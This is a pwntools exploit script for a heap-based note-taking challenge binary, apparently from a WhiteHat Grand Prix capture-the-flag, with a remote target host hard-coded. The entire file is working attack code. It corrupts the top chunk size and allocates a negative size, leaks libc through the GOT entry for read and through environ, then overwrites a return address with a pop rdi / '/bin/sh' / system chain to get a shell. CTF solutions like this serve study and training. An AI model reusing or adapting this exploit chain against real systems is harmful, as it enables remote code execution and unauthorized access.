from pwn import *

def add(size, content):
    r.recvuntil('Your choice:')
    r.send('1\n')
    r.recvuntil('Size of note:')
    r.send(str(size))
    r.recvuntil('Content of note:')
    r.send(content)

def edit(index, content):
    r.recvuntil('Your choice:')
    r.send('2\n')
    r.recvuntil('Index:')
    r.send(str(index))
    r.recvuntil("New content of note:")
    r.send(content)

def show(index):
    r.recvuntil('Your choice:')
    r.send('3\n')
    r.recvuntil('Index:')
    r.send(str(index))
    r.recvuntil('note[%d]: ' %index)
    return r.recvline()

def addname(name):
    r.recvuntil('Your choice:')
    r.send('4\n')
    r.recvuntil("What's your name?")
    r.send(name)

def leave(size, messege):
    r.recvuntil('Your choice:')
    r.send('5')
    r.recvuntil('Messege length:')
    r.send(str(size))
    r.recvuntil('Messege:')
    r.send(messege)

poprdi = 0x400E03
note = 0x602050
readgot = 0x601FC8
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
r = remote('three-page.grandprix.whitehatvn.com', 10206)
# r = process('./three_page')
# gdb.attach(r, "b*0x000000000400D5D")
add(0x1000, "1")
payload = "A"*24
payload += p64(0xffffffffffffffff)
addname(payload)
add((-0x1000), "")
add(0x110, "x")
edit(0, "a"*0x60+p64(0x1000)+p64(readgot))
tmp = show(2)[:-1]+"\x00"*8
read = u64(tmp[:8])
log.info("read: %#x" %read)
base = read - libc.symbols['read']
log.info("base: %#x" %base)
environ = base + libc.symbols['environ']
system = base + libc.symbols['system']
sh = base + next(libc.search('/bin/sh\x00'))
log.info("system: %#x" %system)
log.info("sh: %#x" %sh)
edit(0, "a"*0x60+p64(0x1000)+p64(environ))
tmp = show(2)[:-1]+"\x00"*8
ret_edit = u64(tmp[:8])-0x100
log.info("return address of edit: %#x" %ret_edit)
edit(0, "a"*0x60+p64(0x1000)+p64(ret_edit))
edit(2, p64(poprdi)+p64(sh)+p64(system))
r.interactive()